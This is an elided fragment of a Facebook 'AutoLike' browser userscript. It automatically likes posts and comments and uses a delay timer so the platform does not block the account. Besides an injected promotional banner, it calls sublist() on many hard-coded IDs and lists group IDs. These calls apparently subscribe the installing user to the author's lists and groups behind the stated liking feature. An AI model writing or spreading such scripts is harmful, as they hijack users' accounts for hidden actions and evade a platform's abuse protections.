...
// @description		        *[ AUTOLIKE BOoM ]* AutoLike Facebook coded by katak network. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/notes/king-katak/facebook-emosi-for-chat-comment/499918226745169' target='_blank' title='NEW' ><blink><center>NEW FACEBOOK</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
sublist("111321239076684");
sublist("118943198305604");

sublist("133190783547512");
sublist("133232263543364");
sublist("133232536876670");
sublist("133232683543322");
sublist("135761523290438");
sublist("135761673290423");
sublist("135761769957080");
sublist("135761406623783");
...
var gid = ['276330759177257'];
var gid = ['1407766302776060'];
